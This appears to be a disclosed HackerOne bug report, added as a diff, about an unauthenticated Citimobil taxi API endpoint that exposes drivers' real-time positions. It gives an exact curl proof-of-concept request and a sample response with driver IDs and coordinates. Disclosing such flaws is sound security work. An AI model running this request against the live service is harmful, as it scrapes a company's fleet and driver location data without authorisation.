@@ -1,0 +1,59 @@
+ReportLink:https://hackerone.com/reports/756833
+WeaknessName:Insecure Storage of Sensitive Information
+Reporter:https://hackerone.com/krupnikas
+ReportedTo:Mail.ru(mailru)
+BountyAmount:
+Severity:none
+State:Closed
+DateOfDisclosure:18.12.2019 18:12:37
+
+Summary:
+
+Domain, site, application
+--
+API for client app Citimobil
+https://c-api.city-mobil.ru/
+Version 4.33.0 (and others)
+
+Testing environment
+--
+Device on any OS with internet connection
+Any software to send https requests
+
+Steps to reproduce
+--
+Send POST request to url "https://c-api.city-mobil.ru/getdrivers" with data:
+{
+        "latitude": LAT,
+        "longitude": LON,
+        "limit": 10,
+        "method": "getdrivers",
+        "radius": 5,
+        "tariff_group":  [ 4 ],
+        "ver": "4.33.0"
+}
+
+Actual results
+--
+Response will contain GEO and BUSINESS data about 10 drivers nearest to the requested point - their positions, color codes, directions and car types.  Iterating over different city locations you can get the whole information about company fleet.
+
+The response will proceed without any authentication. So the sensitive real-time information about company fleet is public available. 
+
+Expected results, security impact description and recommendations
+--
+The authentication procedure for this data should be required 
+
+PoC, exploit code, screenshots, video, references, additional resources
+--
+**Request:**
+```
+curl -X POST --data '{ "latitude": 55.7, "limit": 10, "longitude": 37.6, "method": "getdrivers", "radius": 5, "tariff_group": [4], "ver": "4.33.0" }' https://c-api.city-mobil.ru/getdrivers
+```
+**Response:**
+~~~
+{"drivers":[{"id":"1c1f6779f893af6fe5bf4509af7366cd","lt":"55.7025061","ln":"37.5954334","direction":"3","CarColorCode":"000000","car_type":"comfort_plus"},{"id":"1a13d0daad9b6a3fa2b3d04a5b6f8c2a","lt":"55.7019682","ln":"37.6054896","direction":"3","CarColorCode":"000000","car_type":"comfort"},{"id":"c7c1634fae41a68924083af1d496d0a7","lt":"55.7014223","ln":"37.6067352","direction":"3","CarColorCode":"000000","car_type":"comfort_plus"},{"id":"f15ce054ccdaa268b16a0904b9eecdae","lt":"55.6956527","ln":"37.5972063","direction":"4","CarColorCode":"000000","car_type":"sedan"},{"id":"94ebc0fcc644bb1da4b57e7d23942e6d","lt":"55.694786","ln":"37.5982642","direction":"4","CarColorCode":"000000","car_type":"sedan"},{"id":"7251c45ee945c9cb839d69d5902b9f17","lt":"55.7009351","ln":"37.6094206","direction":"3","CarColorCode":"000000","car_type":"comfort"},{"id":"cb9dab2ba7379c3db817dd76ec68e6c5","lt":"55.6950137","ln":"37.6041883","direction":"8","CarColorCode":"000000","car_type":"sedan"},{"id":"761891d9c1129b1678c3eba616249e2b","lt":"55.6944542","ln":"37.5951122","direction":"2","CarColorCode":"000000","car_type":"sedan"},{"id":"4f0e835751cadaa5d5386f0e1374f315","lt":"55.7066516","ln":"37.6011767","direction":"7","CarColorCode":"000000","car_type":"sedan"},{"id":"2eb330cad5e5d9c87e6d0600a9ff10e8","lt":"55.7066801","ln":"37.6009127","direction":"8","CarColorCode":"000000","car_type":"comfort"}],"nearest":{"duration":420},"service_status":1}
+~~~
+
+## Impact
+
+Get sensitive real-time information about company fleet.
